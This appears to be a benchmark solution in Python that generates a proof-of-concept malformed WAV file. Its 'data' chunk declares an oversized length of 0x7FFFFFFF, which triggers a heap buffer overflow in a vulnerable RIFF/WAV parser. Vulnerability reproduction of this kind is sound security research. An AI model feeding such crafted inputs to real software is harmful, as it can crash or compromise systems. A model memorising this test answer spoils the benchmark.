import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in the RIFF/WAV parser.
        The vulnerability occurs when the 'data' chunk size is not properly checked against the 
        bounds of the parent RIFF chunk, causing an out-of-bounds read.
        
        Structure (Total 58 bytes):
        - RIFF Header (12 bytes)
        - fmt Chunk (24 bytes)
        - data Chunk Header (8 bytes)
        - Payload (14 bytes)
        """
        
        # 1. RIFF Header
        # ChunkID: "RIFF"
        # ChunkSize: 50 (File Size 58 - 8 bytes)
        # Format: "WAVE"
        riff_chunk = b'RIFF' + struct.pack('<I', 50) + b'WAVE'
        
        # 2. fmt Chunk
        # Subchunk1ID: "fmt "
        # Subchunk1Size: 16 (Standard PCM chunk size)
        # AudioFormat: 1 (PCM)
        # NumChannels: 1
        # SampleRate: 44100
        # ByteRate: 44100 (SampleRate * NumChannels * BitsPerSample/8)
        # BlockAlign: 1 (NumChannels * BitsPerSample/8)
        # BitsPerSample: 8
        fmt_chunk = b'fmt ' + struct.pack('<I', 16) + \
                    struct.pack('<HHIIHH', 1, 1, 44100, 44100, 1, 8)
        
        # 3. data Chunk
        # Subchunk2ID: "data"
        # Subchunk2Size: 0x7FFFFFFF (Large positive integer)
        # This value exceeds the remaining file size (14 bytes) and the RIFF chunk bounds.
        # A vulnerable parser will attempt to process this many bytes, triggering the overflow.
        data_header = b'data' + struct.pack('<I', 0x7FFFFFFF)
        
        # 4. Payload
        # Remaining bytes to pad the file to 58 bytes.
        # 58 - (12 + 24 + 8) = 14 bytes
        payload = b'\x00' * 14
        
        return riff_chunk + fmt_chunk + data_header + payload